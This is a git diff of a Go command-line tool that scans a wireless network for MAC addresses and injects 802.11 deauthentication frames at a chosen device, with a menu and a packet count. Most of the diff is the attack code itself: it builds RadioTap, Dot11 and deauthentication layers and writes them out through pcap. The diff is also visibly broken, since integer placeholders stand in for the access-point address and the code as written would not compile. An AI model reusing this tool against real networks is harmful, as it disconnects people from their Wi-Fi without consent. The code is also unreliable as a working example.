@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"runtime"
 	"strconv"
 
 	"github.com/google/gopacket"
@@ -21,7 +22,7 @@ func Menu() {
 		choice := userIO.Prompt("(press h for help) " + color.ColorPrint("red", "=> "))
 		switch choice {
 		case "select":
-			iface, err := askInterface()
+			iface, err := AskInterface()
 			if err != nil {
 				fmt.Println("err :", err)
 			} else {
@@ -37,7 +38,7 @@ func Menu() {
 }
 
 // askInterface ask the user to select an interface
-func askInterface() (net.Interface, error) {
+func AskInterface() (pcap.Interface, error) {
 	ifacesList := GetInterfaces()
 	ShowInterfaces(ifacesList)
 	choice := ""
@@ -53,31 +54,33 @@ func askInterface() (net.Interface, error) {
 			return iface, nil
 		}
 	}
-	return net.Interface{}, errors.New(choice + " : not a valid interface")
+	return pcap.Interface{}, errors.New(choice + " : not a valid interface")
 }
 
 // InterfaceMenu show the menu of the interface
-func InterfaceMenu(iface net.Interface) {
+func InterfaceMenu(iface pcap.Interface) {
 	var listMac []string
 	for {
 		choice := userIO.Prompt("(" + color.ColorPrint("cyan", iface.Name) + ") ")
 		switch choice {
 		case "h", "help":
-			fmt.Println("show : show the interface")
-			fmt.Println("scan : scan the network")
+			fmt.Println("scan   : scan the network")
+			fmt.Println("show   : show AP")
 			fmt.Println("deauth : deauth a mac address")
-			fmt.Println("exit : exit")
-		case "show":
-			show(iface)
+			fmt.Println("exit   : exit")
 		case "scan":
 			listMac = scanPkg(iface)
+		case "show":
+			bssid, ssid := 0, 0 //getAP(iface)
+			fmt.Printf("%s : %s\n", ssid, bssid)
 		case "deauth":
 			mac := selectMac(listMac)
 			npacket, err := strconv.Atoi(userIO.Prompt(color.ColorPrint("red", "number of packets ") + "=> "))
 			if err != nil {
 				fmt.Println("err :", err)
 			} else {
-				sendDeauth(iface, mac, npacket)
+				bssid, _ := 0, 0 // getAP(iface)
+				prepareDeauth(iface, mac, bssid, npacket)
 			}
 		case "exit":
 			return
@@ -85,8 +88,8 @@ func InterfaceMenu(iface net.Interface) {
 	}
 }
 
-// scanPkg scan the network and print the packets
-func scanPkg(iface net.Interface) []string {
+// scanPkg scan the network and print the mac addresses
+func scanPkg(iface pcap.Interface) []string {
 	handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
 	if err != nil {
 		fmt.Println("err :", err)
@@ -112,6 +115,7 @@ func scanPkg(iface net.Interface) []string {
 	return nil
 }
 
+// askStop ask the user to stop the mac address scan
 func askStop(c chan string) {
 	scan := bufio.NewScanner(os.Stdin)
 	for {
@@ -167,6 +171,7 @@ func removeDuplicate(s []string) []string {
 	return list
 }
 
+// selectMac ask the user to select a mac address
 func selectMac(listMac []string) net.HardwareAddr {
 	for _, mac := range listMac {
 		fmt.Println(color.ColorPrint("green", "=> "), mac)
@@ -179,7 +184,8 @@ func selectMac(listMac []string) net.HardwareAddr {
 	return macAddr
 }
 
-func sendDeauth(iface net.Interface, mac net.HardwareAddr, npacket int) {
+// prepareDeauth prepare the deauth attack
+func prepareDeauth(iface pcap.Interface, mac net.HardwareAddr, ap net.HardwareAddr, npacket int) {
 	handle, err := pcap.OpenLive(iface.Name, 1600, true, pcap.BlockForever)
 	if err != nil {
 		fmt.Println("err :", err)
@@ -188,51 +194,58 @@ func sendDeauth(iface net.Interface, mac net.HardwareAddr, npacket int) {
 	defer handle.Close()
 	fmt.Println("sending deauth to", mac)
 	for i := 0; i < npacket; i++ {
-		sendDeauthPkg(handle, mac)
+		sendDeauthPkg(ap, mac, handle)
 	}
 }
 
-func sendDeauthPkg(handle *pcap.Handle, mac net.HardwareAddr) {
-	buf := gopacket.NewSerializeBuffer()
-	opts := gopacket.SerializeOptions{
-		ComputeChecksums: true,
-		FixLengths:       true,
-	}
-	eth := layers.Ethernet{
-		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
-		DstMAC:       mac,
-		EthernetType: layers.EthernetTypeDot1Q,
-	}
-	deauth := layers.Dot11MgmtDeauthentication{
-		Dot11Mgmt: layers.Dot11Mgmt{
-			BaseLayer: layers.BaseLayer{
-				Contents: []byte{},
-				Payload:  []byte{},
-			},
+func sendDeauthPkg(ap net.HardwareAddr, mac net.HardwareAddr, handle *pcap.Handle) {
+	for seq := uint16(0); seq < 64; seq++ {
+		// create the packet
+		deauth := gopacket.NewSerializeBuffer()
+		err := gopacket.SerializeLayers(deauth, gopacket.SerializeOptions{
+			ComputeChecksums: true,
 		},
-		Reason: 1,
+			&layers.RadioTap{},
+			&layers.Dot11{
+				Type:           layers.Dot11TypeMgmtDeauthentication,
+				SequenceNumber: seq,
+				Address1:       ap,  // receiver mac address
+				Address2:       mac, // sender mac address
+
+			},
+			&layers.Dot11MgmtDeauthentication{
+				Reason: layers.Dot11ReasonClass2FromNonAuth, // 7
+			})
+		if err != nil {
+			fmt.Println("err :", err)
+			return
+		}
+		injectPacket(handle, deauth.Bytes())
 	}
-	gopacket.SerializeLayers(buf, opts, &eth, &deauth)
-	err := handle.WritePacketData(buf.Bytes())
+}
+
+// injectPacket inject a packet in the network
+func injectPacket(handle *pcap.Handle, packet []byte) {
+	err := handle.WritePacketData(packet)
 	if err != nil {
 		fmt.Println("err :", err)
 	}
 }
 
-func show(iface net.Interface) {
-	fmt.Println("name     :", iface.Name)
-	fmt.Println("mac      :", iface.HardwareAddr)
-	fmt.Println("flags    :", iface.Flags)
-}
-
-func ShowInterfaces(ifaces []net.Interface) {
-	for i := range ifaces {
-		fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name)
+func ShowInterfaces(ifaces []pcap.Interface) {
+	if runtime.GOOS == "windows" {
+		for i := range ifaces {
+			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name+" : "+ifaces[i].Description)
+		}
+	} else {
+		for i := range ifaces {
+			fmt.Println(color.ColorPrint("green", "\t=>"), ifaces[i].Name)
+		}
 	}
 }
 
-func GetInterfaces() []net.Interface {
-	ifaces, err := net.Interfaces()
+func GetInterfaces() []pcap.Interface {
+	ifaces, err := pcap.FindAllDevs()
 	if err != nil {
 		fmt.Println("err :", err)
 		return nil
